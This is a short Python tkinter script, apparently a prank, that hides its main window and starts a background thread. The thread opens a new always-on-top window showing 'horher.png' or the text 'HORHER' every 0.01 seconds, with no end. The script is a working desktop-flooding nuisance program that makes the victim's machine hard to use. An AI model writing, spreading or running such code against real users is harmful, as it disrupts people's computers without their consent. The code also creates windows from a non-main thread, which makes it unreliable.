import tkinter as tk
from tkinter import Label
from PIL import Image, ImageTk
import threading
import time
import random
import os
import shutil
import sys

def create_window():
    """Create a new window with the horher.png image"""
    window = tk.Toplevel()
    window.title("Horher")
    
    # Random position on screen
    x = random.randint(0, 800)
    y = random.randint(0, 600)
    window.geometry(f"+{x}+{y}")
    
    try:
        # Get the directory where this script is located
        script_dir = os.path.dirname(os.path.abspath(__file__))
        image_path = os.path.join(script_dir, "horher.png")
        
        # Load and display the image
        image = Image.open(image_path)
        image = image.resize((200, 200))  # Resize if needed
        photo = ImageTk.PhotoImage(image)
        
        label = Label(window, image=photo)
        label.image = photo  # Keep a reference
        label.pack()
        
    except FileNotFoundError:
        # Fallback if image not found
        label = Label(window, text="HORHER", font=("Arial", 24), fg="red")
        label.pack(padx=50, pady=50)
    
    # Make window stay on top
    window.attributes('-topmost', True)
    
    return window


def spam_windows():
    """Continuously create new windows"""
    while True:
        create_window()
        time.sleep(0.01)  # Delay between window creation

def main():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    
    # Start spamming windows in a separate thread
    spam_thread = threading.Thread(target=spam_windows, daemon=True)
    spam_thread.start()
    
    root.mainloop()

if __name__ == "__main__":
    main()
